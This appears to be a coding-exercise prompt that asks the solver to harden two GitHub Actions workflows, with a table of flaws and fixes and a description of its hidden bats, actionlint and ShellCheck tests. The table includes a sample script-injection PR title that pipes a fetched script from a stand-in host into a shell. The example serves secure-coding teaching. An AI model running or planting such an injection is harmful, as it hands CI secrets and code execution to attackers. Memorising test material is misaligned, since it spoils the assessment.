# Secure the Pipeline: Harden Two GitHub Actions Workflows

A CI/CD system holds the keys to production, so attackers aim at it. The two workflows in
`.github/workflows/` work, and both are exploitable. Fix them without losing what they do:
`pr.yml` still tests every pull request (from forks too) and `release.yml` still publishes
each `v*` tag with `scripts/publish.sh`.

| Problem | Why it is dangerous | Fix |
| --- | --- | --- |
| `pr.yml` uses `pull_request_target` and checks out the PR's head | the fork's code runs with a **write** token and the repository's secrets | trigger on `pull_request` (same `types`); check out the default ref, no `ref:` |
| `permissions: write-all` | a compromised step can push code, tags and releases | top-level `contents: read` in both; `release.yml`'s job adds only `id-token: write` |
| `${{ github.event.pull_request.title }}` inside `run:` | **script injection**: a title like `` "; curl evil.sh \| sh # `` becomes shell code | no `${{ }}` in any `run:`; pass values through `env:` (`PR_TITLE`, `VERSION`, ...) and quote `"$PR_TITLE"` |
| `curl ... \| bash` | runs whatever that server returns today | remove the step (the linter is not needed to test) |
| `secrets.NPM_TOKEN` in a PR workflow | secrets must never reach untrusted code | `pr.yml` uses no secrets at all |
| actions at `@v7`, `@v6` or `@main` | a moved tag or branch runs new, unreviewed code | pin every action to a 40-character commit SHA |
| no timeouts | a hung job burns minutes and blocks releases | `timeout-minutes` on every job |
| checkout leaves the token in `.git/config` | later steps (and anything they run) can read it | `persist-credentials: false` |
| long-lived AWS keys in secrets | a leaked key works until someone notices | OIDC: `role-to-assume: arn:aws:iam::123456789012:role/release`, region `eu-west-1`, no `aws-access-key-id` |
| the deploy token is echoed into the log | logs are read by many people and kept for months | `env: { DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }} }` on the publish step, which runs `./scripts/publish.sh "$VERSION"` and prints nothing about the token |
| anyone with push rights can publish | releases should need a reviewer | `environment: release` on the publish job |

Pins you can use: `actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1` (v7.0.1),
`aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd` (v6.3.0).

The dojo checks both workflows with actionlint (which reports script injection and runs
ShellCheck on every `run:`), runs ShellCheck on `scripts/publish.sh`, and reads the
workflows with bats.

There are 15 tests: 1 in `tests/visible.bats`, 11 hidden ones, ShellCheck and actionlint for
each workflow.
